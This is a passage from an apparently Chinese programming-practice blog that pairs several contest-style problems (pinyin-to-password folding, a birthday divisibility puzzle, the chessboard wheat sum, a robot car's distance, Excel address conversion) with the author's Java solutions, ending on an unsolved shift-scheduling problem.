class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在对银行账户等重要权限设置密码的时候，我们常常遇到这样的烦恼：如果为了好记用生日吧，容易被破解，不安全；如果设置不好记的密码，又担心自己也会忘记；如果写在纸上，担心纸张被别人发现或弄丢了…<br>这个程序的任务就是把一串拼音字母转换为6位数字（密码）。我们可以使用任何好记的拼音串(比如名字，王喜明，就写：wangximing)作为输入，程序输出6位数字。<br>变换的过程如下：<br>第一步. 把字符串6个一组折叠起来，比如wangximing则变为：<br>wangxi<br>ming<br>第二步. 把所有垂直在同一个位置的字符的ascii码值相加，得出6个数字，如上面的例子，则得出：<br>228 202 220 206 120 105<br>第三步. 再把每个数字“缩位”处理：就是把每个位的数字相加，得出的数字如果不是一位数字，就再缩位，直到变成一位数字为止。例如: 228 =&gt; 2+2+8=12 =&gt; 1+2=3<br>上面的数字缩位后变为：344836, 这就是程序最终的输出结果！<br>要求程序从标准输入接收数据，在标准输出上输出结果。<br>输入格式为：第一行是一个整数n（&lt;100），表示下边有多少输入行，接下来是n行字符串，就是等待变换的字符串。<br>输出格式为：n行变换后的6位密码。<br>例如，输入：<br>5<br>zhangfeng<br>wangximing<br>jiujingfazi<br>woaibeijingtiananmen<br>haohaoxuexi<br>则输出：<br>772243<br>344836<br>297332<br>716652<br>875843</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析，先把每一个字符串存到二维数组中，然后把对应位置上的字符的ascii值相加</span><br><span class="line"> */</span><br><span class="line">import java.util.*;</span><br><span class="line">public class T11 &#123;</span><br><span class="line">	private static final int STRLEN = 6; /* 产生的密码长度 */</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		Scanner sc = new Scanner( System.in );</span><br><span class="line">		System.out.print( &quot;请输入行数:&quot; );</span><br><span class="line">		int rows = sc.nextInt();</span><br><span class="line">		if ( rows &lt; 100 )</span><br><span class="line">		&#123;</span><br><span class="line">			System.out.println( &quot;请输入&quot; + rows + &quot;行字符串：&quot; );</span><br><span class="line">			String	str[]	= new String[rows];     /* 存储输入的字符串 */</span><br><span class="line">			String	str2[]	= new String[rows];     /* 存储返回来的密码的字符串 */</span><br><span class="line">			for ( int i = 0; i &lt; rows; i++ )</span><br><span class="line">			&#123;</span><br><span class="line">				str[i]	= sc.next();</span><br><span class="line">				str2[i] = test11( str[i] );</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println( &quot;输出:&quot; );</span><br><span class="line">			for ( String s : str2 )</span><br><span class="line">			&#123;</span><br><span class="line">				System.out.println( s );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			System.out.println( &quot;请输入小于100的数！！&quot; );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static String test11( String string )</span><br><span class="line">	&#123;</span><br><span class="line">		int	stringLen	= string.length();</span><br><span class="line">		int	p		= 0; /* 判断定义二维数组中一维的大小 */</span><br><span class="line">		if ( 0 != stringLen % STRLEN )</span><br><span class="line">		&#123;</span><br><span class="line">			p = stringLen / STRLEN + 1;</span><br><span class="line">		&#125;else if ( 0 == stringLen % STRLEN )</span><br><span class="line">		&#123;</span><br><span class="line">			p = stringLen / STRLEN;</span><br><span class="line">		&#125;</span><br><span class="line">		int	asc[][] = new int[p][STRLEN];   /* 用来存储字符串中每一个字母的ascii值的数组 */</span><br><span class="line">		int	asc2[]	= new int[STRLEN];      /* 用来存储asc中对应位置的值的数组 */</span><br><span class="line">		int	st	= 0;</span><br><span class="line">		int	nd	= 0;</span><br><span class="line">/* 把每一个字母的ascii值放入到二维数组中 */</span><br><span class="line">		for ( int i = 0; i &lt; stringLen; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">/* System.out.print((int)string.charAt(i)+&quot; &quot;); */</span><br><span class="line">			if ( st &lt; p )</span><br><span class="line">			&#123;</span><br><span class="line">				asc[st][nd] = (int) string.charAt( i );</span><br><span class="line">				nd++;</span><br><span class="line">				if ( STRLEN == nd )</span><br><span class="line">				&#123;</span><br><span class="line">					st++;</span><br><span class="line">					nd = 0;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		st	= 0;</span><br><span class="line">		nd	= 0;</span><br><span class="line">		int sum = 0;</span><br><span class="line">/* 把对应位置上的ascii值相加放到数组中 */</span><br><span class="line">		while ( true )</span><br><span class="line">		&#123;</span><br><span class="line">			if ( st &lt; p )</span><br><span class="line">			&#123;</span><br><span class="line">/* System.out.println(&quot;st: &quot; + st + &quot; nd: &quot; + nd); */</span><br><span class="line">				sum		+= asc[st][nd];</span><br><span class="line">				asc2[nd]	= sum;</span><br><span class="line">				st++;</span><br><span class="line">				if ( p == st )</span><br><span class="line">				&#123;</span><br><span class="line">					sum	= 0;</span><br><span class="line">					st	= 0;</span><br><span class="line">					nd++;</span><br><span class="line">					if ( STRLEN == nd )</span><br><span class="line">						break;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		String result = &quot;&quot;;</span><br><span class="line">		for ( int i = 0; i &lt; asc2.length; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			String	tmp	= asc2[i] + &quot;&quot;;</span><br><span class="line">			String	tmp2	= dg( tmp );</span><br><span class="line">			result += tmp2;</span><br><span class="line">		&#125;</span><br><span class="line">/*</span><br><span class="line"> * //---------------打印区域------------------</span><br><span class="line"> * System.out.println();</span><br><span class="line"> * for(int i=0;i&lt;p;i++)&#123;</span><br><span class="line"> * for(int j=0;j&lt;STRLEN;j++)&#123;</span><br><span class="line"> * System.out.printf(&quot;%3d &quot;,asc[i][j]);</span><br><span class="line"> * &#125;</span><br><span class="line"> * System.out.println();</span><br><span class="line"> * &#125;</span><br><span class="line"> * System.out.println();</span><br><span class="line"> * for(int i : asc2)&#123;</span><br><span class="line"> * System.out.printf(&quot;%3d &quot;,i);</span><br><span class="line"> * &#125;</span><br><span class="line"> * //------------------------------------------</span><br><span class="line"> */</span><br><span class="line">		return(result);</span><br><span class="line">	&#125;</span><br><span class="line">/* 数字缩位 */</span><br><span class="line">	public static String dg( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( str != null || str != &quot;&quot; )</span><br><span class="line">		&#123;</span><br><span class="line">			if ( 1 == str.length() )</span><br><span class="line">			&#123;</span><br><span class="line">				return(str);</span><br><span class="line">			&#125; else if ( 1 != str.length() )</span><br><span class="line">			&#123;</span><br><span class="line">				int sum = 0;</span><br><span class="line">				for ( int i = 0; i &lt; str.length(); i++ )</span><br><span class="line">				&#123;</span><br><span class="line">					sum += Integer.parseInt( str.charAt( i ) + &quot;&quot; );</span><br><span class="line">				&#125;</span><br><span class="line">				return(dg( sum + &quot;&quot; ) );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return(null);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>今年的植树节（2012年3月12日），小明和他的叔叔还有小伙伴们一起去植树。休息的时候，小明的同学问他叔叔多大年纪，他叔叔说：“我说个题目，看你们谁先猜出来！”<br>“把我出生的年月日连起来拼成一个8位数（月、日不足两位前补0）正好可以被今天的年、月、日整除！”<br>他想了想，又补充到：“再给个提示，我是6月出生的。”<br>根据这些信息，请你帮小明算一下，他叔叔的出生年月日。<br>答案写在“解答.txt”中，不要写在这里！<br>格式是年月日连成的8位数。<br>例如，如果是1948年6月12日，就写：19480612</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析：循环逐一得到比较</span><br><span class="line"> */</span><br><span class="line">public class T12 &#123;</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		int birth = test();</span><br><span class="line">		System.out.println( &quot;birth: &quot; + birth );</span><br><span class="line">	&#125;</span><br><span class="line">	public static int test()</span><br><span class="line">	&#123;</span><br><span class="line">		for ( int i = 1900; i &lt; 2012; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			for ( int j = 1; j &lt;= 30; j++ )</span><br><span class="line">			&#123;</span><br><span class="line">				int birth = i * 10000 + 6 * 100 + j;</span><br><span class="line">				if ( 0 == birth % 2012 &amp;&amp; 0 == birth % 12 &amp;&amp; 0 == birth % 3 )</span><br><span class="line">				&#123;</span><br><span class="line">					return(birth);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return(0);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你一定听说过这个故事。国王对发明国际象棋的大臣很佩服，问他要什么报酬，大臣说：<br>请在第1个棋盘格放1粒麦子，在第2个棋盘格放2粒麦子，<br>在第3个棋盘格放4粒麦子，在第4个棋盘格放8粒麦子，……<br>后一格的数字是前一格的两倍，直到放完所有棋盘格（国际象棋共有64格）。<br>国王以为他只是想要一袋麦子而已，哈哈大笑。<br>当时的条件下无法准确计算，但估算结果令人吃惊：即使全世界都铺满麦子也不够用！<br>请你借助计算机准确地计算，到底需要多少粒麦子。<br>答案写在“解答.txt”中，不要写在这里！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析：这个题目比较简单，不过注意数值越界</span><br><span class="line"> */</span><br><span class="line">public class T13 &#123;</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		double sum = test();</span><br><span class="line">		System.out.println( &quot;sum=&quot; + sum );</span><br><span class="line">	&#125;</span><br><span class="line">	public static double test()</span><br><span class="line">	&#123;</span><br><span class="line">		double	sum	= 0;</span><br><span class="line">		double	a	= 1;</span><br><span class="line">		for ( int i = 2; i &lt;= 64; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			a	= a * 2;</span><br><span class="line">			sum	+= a;</span><br><span class="line">		&#125;</span><br><span class="line">		return(sum + 1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>【编程题】(满分18分)<br>某少年宫引进了一批机器人小车。可以接受预先输入的指令，<br>按指令行动。小车的基本动作很简单，<br>只有3种：左转（记为L），右转（记为R），向前走若干厘米（直接记数字）。<br>例如，我们可以对小车输入如下的指令：<br>15L10R5LRR10R20<br>则，小车先直行15厘米，左转，再走10厘米，再右转，…<br>不难看出，对于此指令串，小车又回到了出发地。<br>你的任务是：编写程序，由用户输入指令，<br>程序输出每条指令执行后小车位置与指令执行前小车位置的直线距离。<br>【输入、输出格式要求】<br>用户先输入一个整数n（n&lt;100），表示接下来将有n条指令。<br>接下来输入n条指令。每条指令只由L、R和数字组成（数字是0~100之间的整数）<br>每条指令的长度不超过256个字符。<br>程序则输出n行结果。<br>每条结果表示小车执行相应的指令前后位置的直线距离。要求四舍五入到小数后2位。<br>例如：用户输入：<br>5<br>L100R50R10<br>3LLL5RR4L12<br>LL<br>100R<br>5L5L5L5<br>则程序输出：<br>102.96<br>9.06<br>0.00<br>100.00<br>0.00<br>【注意】<br>请仔细调试！您的程序只有能运行出正确结果的时候才有机会得分！<br>请把所有类写在同一个文件中，调试好后，<br>存入与【考生文件夹】下对应题号的“解答.txt”中即可。<br>相关的工程文件不要拷入。<br>请不要使用package语句。<br>源程序中只能出现JDK1.5中允许的语法或调用。不能使用1.6或更高版本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析：用坐标的方法，解析到得数字然后进行进行位移x，y 然后direction 换方向</span><br><span class="line"> */</span><br><span class="line">import java.util.*;</span><br><span class="line">import java.util.regex.*;</span><br><span class="line">public class T14_1 &#123;</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		Scanner sc = new Scanner( System.in );</span><br><span class="line">		System.out.print( &quot;请输入指令条数（指令条数&lt;100）: &quot; );</span><br><span class="line">		int x = sc.nextInt();</span><br><span class="line">		if ( x &lt; 100 )</span><br><span class="line">		&#123;</span><br><span class="line">			System.out.println( &quot;请输入指令（指令的长度不超过256个字符）: &quot; );</span><br><span class="line">			String	commands[]	= new String[x];</span><br><span class="line">			Double	result[]	= new Double[x];</span><br><span class="line">			for ( int i = 0; i &lt; x; i++ )</span><br><span class="line">			&#123;</span><br><span class="line">				commands[i] = sc.next();</span><br><span class="line">				if ( commands[i].length() &lt; 256 &amp;&amp; Pattern.matches( &quot;^[LR0-9]+$&quot;, commands[i] ) )</span><br><span class="line">				&#123;</span><br><span class="line">					result[i] = test( commands[i] );</span><br><span class="line">				&#125;else &#123;</span><br><span class="line">					System.out.println( &quot;输入的指令长度超过了256 或 指令不正确（每条指令只由L、R和数字组成（数字是0~100之间的整数））！！！&quot; );</span><br><span class="line">					System.exit( 0 );</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println( &quot;输出: &quot; );</span><br><span class="line">			for ( double d : result )</span><br><span class="line">			&#123;</span><br><span class="line">				System.out.printf( &quot;%.2f\n&quot;, d );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			System.out.println( &quot;输入的指令超过了100条!!!&quot; );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static double test( String command )</span><br><span class="line">	&#123;</span><br><span class="line">		int	direction	= 1; /* 0 x负半轴 1 y正半轴 2 x正半轴 3 y负半轴 */</span><br><span class="line">		double	x		= 0;</span><br><span class="line">		double	y		= 0;</span><br><span class="line">		String	str		= &quot;0&quot;;</span><br><span class="line">		int	i		= 0;</span><br><span class="line">		char	temp;</span><br><span class="line">		while ( i &lt; command.length() )</span><br><span class="line">		&#123;</span><br><span class="line">			temp = command.charAt( i );</span><br><span class="line">			if ( temp &gt;= &apos;0&apos; &amp;&amp; temp &lt;= &apos;9&apos; )</span><br><span class="line">			&#123;</span><br><span class="line">				str += temp;</span><br><span class="line">			&#125; else if ( &apos;L&apos; == temp )</span><br><span class="line">			&#123;</span><br><span class="line">				int length = Integer.parseInt( str );</span><br><span class="line">				switch ( direction )</span><br><span class="line">				&#123;</span><br><span class="line">				case 0: x	= x - length; break;</span><br><span class="line">				case 1: y	= y + length; break;</span><br><span class="line">				case 2: x	= x + length; break;</span><br><span class="line">				case 3: y	= y - length; break;</span><br><span class="line">				&#125;</span><br><span class="line">				str		= &quot;0&quot;;</span><br><span class="line">				direction	= (direction - 1); /* 调整当前位置的方向 */</span><br><span class="line">				if ( direction == -1 )</span><br><span class="line">				&#123;</span><br><span class="line">					direction = 3;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else if ( &apos;R&apos; == temp )</span><br><span class="line">			&#123;</span><br><span class="line">				int length = Integer.parseInt( str );</span><br><span class="line">				switch ( direction )</span><br><span class="line">				&#123;</span><br><span class="line">				case 0: x	= x - length; break;</span><br><span class="line">				case 1: y	= y + length; break;</span><br><span class="line">				case 2: x	= x + length; break;</span><br><span class="line">				case 3: y	= y - length; break;</span><br><span class="line">				&#125;</span><br><span class="line">				str		= &quot;0&quot;;</span><br><span class="line">				direction	= (direction + 1);</span><br><span class="line">				if ( direction == 4 )</span><br><span class="line">				&#123;</span><br><span class="line">					direction = 0;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		int length = Integer.parseInt( str );</span><br><span class="line">		switch ( direction )</span><br><span class="line">		&#123;</span><br><span class="line">		case 0: x	= x - length; break;</span><br><span class="line">		case 1: y	= y + length; break;</span><br><span class="line">		case 2: x	= x + length; break;</span><br><span class="line">		case 3: y	= y - length; break;</span><br><span class="line">		&#125;</span><br><span class="line">		return(Math.sqrt( x * x + y * y ) );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>【编程题】(满分21分)<br>Excel是最常用的办公软件。每个单元格都有唯一的地址表示。比如：第12行第4列表示为：“D12”，第5行第255列表示为“IU5”。</p>
<p>事实上，Excel提供了两种地址表示方法，还有一种表示法叫做RC格式地址。 第12行第4列表示为：“R12C4”，第5行第255列表示为“R5C255”。<br>你的任务是：编写程序，实现从RC地址格式到常规地址格式的转换。<br>【输入、输出格式要求】<br>用户先输入一个整数n（n&lt;100），表示接下来有n行输入数据。<br>接着输入的n行数据是RC格式的Excel单元格地址表示法。<br>程序则输出n行数据，每行是转换后的常规地址表示法。<br>例如：用户输入：<br>2<br>R12C4<br>R5C255<br>则程序应该输出：<br>D12<br>IU5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 分析，发现其中的规律就好做</span><br><span class="line"> */</span><br><span class="line">import java.util.*;</span><br><span class="line">import java.util.regex.*;</span><br><span class="line">public class T15 &#123;</span><br><span class="line">	public static void main( String[] args )</span><br><span class="line">	&#123;</span><br><span class="line">		Scanner sc = new Scanner( System.in );</span><br><span class="line">		System.out.print( &quot;请输入一个整数n(n&lt;100)：&quot; );</span><br><span class="line">		int		x	= sc.nextInt();</span><br><span class="line">		List&lt;String&gt;	list	= new ArrayList&lt;String&gt;();</span><br><span class="line">		if ( x &lt; 100 )</span><br><span class="line">		&#123;</span><br><span class="line">			int i = 0;</span><br><span class="line">			while ( i &lt; x )</span><br><span class="line">			&#123;</span><br><span class="line">				String temp = sc.next();</span><br><span class="line">				if ( Pattern.matches( &quot;R\\d&#123;1,3&#125;C\\d&#123;1,3&#125;&quot;, temp ) )</span><br><span class="line">				&#123;</span><br><span class="line">					list.add( temp );</span><br><span class="line">					i++;</span><br><span class="line">				&#125;else &#123;</span><br><span class="line">					System.out.println( &quot;格式输入不正确!!&quot; );</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			System.out.println( &quot;输入数字大小超过了100！！！&quot; );</span><br><span class="line">			System.exit( 0 );</span><br><span class="line">		&#125;</span><br><span class="line">		String strs[] = new String[list.size()];</span><br><span class="line">		for ( int i = 0; i &lt; list.size(); i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			String str = list.get( i );</span><br><span class="line">			strs[i] = test( str );</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println( &quot;输出：&quot; );</span><br><span class="line">		for ( String s : strs )</span><br><span class="line">		&#123;</span><br><span class="line">			System.out.println( s );</span><br><span class="line">		&#125;</span><br><span class="line">/*</span><br><span class="line"> * String transferStr = test(&quot;R5C255&quot;);</span><br><span class="line"> * System.out.println(&quot;transferStr: &quot; + transferStr);</span><br><span class="line"> */</span><br><span class="line">	&#125;</span><br><span class="line">	public static String test( String str )</span><br><span class="line">	&#123;</span><br><span class="line">		String	transferStr	= &quot;&quot;;   /* 转换后的字符串 */</span><br><span class="line">		String	transferStr1	= &quot;&quot;;   /* 转换后的字符串后面的数字 */</span><br><span class="line">		int	i		= 0;</span><br><span class="line">		String	tmp		= &quot;0&quot;;</span><br><span class="line">		char	c;</span><br><span class="line">		while ( i &lt; str.length() )</span><br><span class="line">		&#123;</span><br><span class="line">			c = str.charAt( i );</span><br><span class="line">			if ( c &gt;= &apos;0&apos; &amp;&amp; c &lt;= &apos;9&apos; )</span><br><span class="line">			&#123;</span><br><span class="line">				tmp += c;</span><br><span class="line">			&#125;else if ( &apos;C&apos; == c )</span><br><span class="line">			&#123;</span><br><span class="line">				int st = Integer.parseInt( tmp );</span><br><span class="line">				transferStr1	= st + &quot;&quot;;              /* R后面的数字 */</span><br><span class="line">				tmp		= &quot;0&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		int		st	= Integer.parseInt( tmp );      /* C后面的数字 */</span><br><span class="line">		StringBuffer	sb	= new StringBuffer();</span><br><span class="line">		char chs[] = new char[] &#123;</span><br><span class="line">			&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;,</span><br><span class="line">			&apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;,</span><br><span class="line">			&apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;,</span><br><span class="line">			&apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;,</span><br><span class="line">			&apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;</span><br><span class="line">		&#125;;</span><br><span class="line">		if ( st &lt;= 26 )</span><br><span class="line">		&#123;</span><br><span class="line">			sb.append( chs[st - 1] + &quot;&quot; );</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			int	temp1	= st / 26 - 1;</span><br><span class="line">			int	temp2	= st % 26 - 1;</span><br><span class="line">			sb.append( chs[temp1] + &quot;&quot; + chs[temp2] );</span><br><span class="line">		&#125;</span><br><span class="line">		transferStr = sb.toString() + transferStr1;</span><br><span class="line">		return(transferStr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>【编程题】(满分34分)<br>某保密单位机要人员 A，B，C，D，E 每周需要工作5天，休息2天。<br>上级要求每个人每周的工作日和休息日安排必须是固定的，不能在周间变更。<br>此外，由于工作需要，还有如下要求：</p>
<ol>
<li>所有人的连续工作日不能多于3天（注意：周日连到下周一也是连续）。</li>
<li>一周中，至少有3天所有人都是上班的。</li>
<li>任何一天，必须保证 A B C D 中至少有2人上班。</li>
<li>B D E 在周日那天必须休息。</li>
<li>A E 周三必须上班。</li>
<li>A C 一周中必须至少有4天能见面（即同时上班）。<br>你的任务是：编写程序，列出ABCDE所有可能的一周排班情况。<br>工作日记为1，休息日记为0</li>
</ol>
